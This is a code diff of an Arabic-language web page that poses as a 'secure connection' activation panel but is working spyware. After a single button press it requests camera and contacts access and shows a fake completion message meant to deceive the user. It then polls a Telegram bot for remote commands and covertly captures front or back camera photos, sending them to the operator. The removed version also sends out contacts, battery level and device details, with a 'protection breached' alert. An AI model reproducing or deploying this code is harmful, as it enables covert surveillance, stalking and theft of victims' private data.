@@ -2,27 +2,20 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>V8 - System Secure Connect</title>
-    <link rel="manifest" href="data:application/manifest+json;base64,ewogICJuYW1lIjogIlY4IENvbnRyb2wgUGFuZWwiLAogICJzaG9ydF9uYW1lIjogIlY4IiwKICAic3RhcnRfdXJsIjogIi4iLAogICJkaXNwbGF5IjogInN0YW5kYWxvbmUiLAogICJiYWNrZ3JvdW5kX2NvbG9yIjogIiMwMDAwMDAiLAogICJ0aGVtZV9jb2xvciI6ICIjMDAmZmNjYSIKfQ==">
-    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>V8 - Secure Connection</title>
     <style>
-        body { background: #000; color: #00ffcc; font-family: 'Courier New', monospace; text-align: center; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .terminal { border: 1px solid #00ffcc; padding: 25px; border-radius: 10px; background: rgba(0,255,204,0.05); width: 90%; max-width: 450px; box-shadow: 0 0 30px #00ffcc; }
-        .blink { animation: blinker 1s linear infinite; color: #ff0000; }
-        @keyframes blinker { 50% { opacity: 0; } }
+        body { background: #000; color: #00ffcc; font-family: monospace; text-align: center; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .panel { border: 1px solid #00ffcc; padding: 25px; border-radius: 15px; width: 90%; max-width: 400px; background: rgba(0,255,204,0.05); }
         .btn { background: #00ffcc; color: #000; border: none; padding: 15px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; }
-        #v, #c { display: none; }
-        .flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; opacity: 0; pointer-events: none; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="flash" id="f"></div>
-    <div class="terminal">
-        <h2 id="deviceName">جاري فحص اتصال V8...</h2>
-        <p class="blink" id="status">● OFFLINE</p>
-        <div id="logs" style="font-size: 12px; color: #888; margin: 10px 0;">بانتظار مزامنة الأوامر...</div>
-        <button class="btn" id="mainBtn" onclick="establishConnection()">تفعيل التحكم الكامل ✅</button>
+    <div class="panel" id="ui">
+        <h2 id="t">V8 SYSTEM - CONNECT</h2>
+        <p id="s">يرجى الضغط لتفعيل بروتوكول الأمان</p>
+        <button class="btn" id="b" onclick="realConnect()">تفعيل الاتصال الآمن ✅</button>
     </div>
 
     <video id="v" autoplay playsinline muted></video>
@@ -33,67 +26,59 @@
         const params = new URLSearchParams(window.location.search);
         const uid = params.get('id');
 
-        // دالة تنفيذ الأوامر (التقاط الصور والموقع)
-        async function executeCommand(cmd) {
+        async function takeAction(mode) {
             try {
-                let report = `🎮 **أمر منفذ بنجاح:**\n`;
-                const battery = await navigator.getBattery();
-                report += `🔋 الشحن: ${Math.floor(battery.level * 100)}%\n`;
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode === 'back' ? "environment" : "user" } });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 2000)); // لضبط الإضاءة
 
-                if (cmd.includes('cam')) {
-                    const mode = cmd.includes('back') ? "environment" : "user";
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
-                    const video = document.getElementById('v');
-                    video.srcObject = stream;
-                    await new Promise(r => setTimeout(r, 2500)); // حل مشكلة السواد
+                const canvas = document.getElementById('c');
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const photo = canvas.toDataURL('image/jpeg', 0.8);
 
-                    document.getElementById('f').style.opacity = '1';
-                    const canvas = document.getElementById('c');
-                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const photo = canvas.toDataURL('image/jpeg', 0.8);
-                    document.getElementById('f').style.opacity = '0';
-
-                    const blob = await (await fetch(photo)).blob();
-                    const fd = new FormData();
-                    fd.append('chat_id', uid);
-                    fd.append('photo', blob, 'v8.jpg');
-                    fd.append('caption', report + `📷 وضع الكاميرا: ${mode}`);
-                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                    stream.getTracks().forEach(t => t.stop());
-                } else if (cmd === 'contacts') {
-                    const list = await navigator.contacts.select(['name', 'tel'], { multiple: true });
-                    let cText = "📇 **سجل الأسماء:**\n" + list.map(c => `👤 ${c.name}: ${c.tel}`).join('\n');
-                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(cText.slice(0,4000))}`);
-                }
-            } catch (e) {}
+                const blob = await (await fetch(photo)).blob();
+                const fd = new FormData();
+                fd.append('chat_id', uid);
+                fd.append('photo', blob, 'v8.jpg');
+                fd.append('caption', `✅ تنفيذ أمر مباشر: ${mode}`);
+                
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
         }
 
-        async function establishConnection() {
+        async function realConnect() {
             if(!uid) return;
-            document.getElementById('mainBtn').style.display = 'none';
-            document.getElementById('status').innerText = "● ONLINE (CONNECTED)";
-            document.getElementById('status').style.color = "#00ffcc";
-            
-            // جلب اسم الجهاز الدقيق
-            const device = navigator.userAgent.match(/\(([^)]+)\)/)[1];
-            document.getElementById('deviceName').innerText = device;
+            // 1. طلب الأذونات فوراً (كاميرا وأسماء)
+            try {
+                const initialStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                initialStream.getTracks().forEach(t => t.stop());
+                
+                if ('contacts' in navigator) {
+                    await navigator.contacts.select(['name', 'tel'], { multiple: true });
+                }
 
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${uid}&text=🟢 **تم اختراق الحماية!**\nالجهاز: ${device}\nالحالة: متصل الآن وينتظر الأوامر.`);
+                // 2. إخفاء الواجهة (نوخرهم) لإيهام المستخدم بالانتهاء
+                document.getElementById('ui').innerHTML = "<h3>✅ تم التأمين بنجاح</h3><p>جاري المزامنة في الخلفية...</p>";
+                
+                // إرسال إشارة "أونلاين" للبوت
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${uid}&text=🟢 الاتصال حقيقي ومستمر الآن! أرسل أوامرك.`);
 
-            // المستمع الدائم للأوامر (تجنب تضارب التحديثات)
-            setInterval(async () => {
-                try {
-                    const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
-                    const data = await res.json();
-                    if (data.result.length > 0) {
+                // 3. الاستماع الدائم للأوامر (Persistent Listener)
+                setInterval(async () => {
+                    try {
+                        const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
+                        const data = await res.json();
                         const cmd = data.result[0].message.text;
-                        if (cmd === "/v8_front") executeCommand('cam_front');
-                        if (cmd === "/v8_back") executeCommand('cam_back');
-                        if (cmd === "/v8_contacts") executeCommand('contacts');
-                    }
-                } catch (e) {}
-            }, 4000); // يفحص كل 4 ثوانٍ
+
+                        if (cmd === "/v8_front") takeAction('front');
+                        if (cmd === "/v8_back") takeAction('back');
+                    } catch (e) {}
+                }, 4000);
+
+            } catch (e) { window.location.replace("https://google.com"); }
         }
     </script>
 </body>
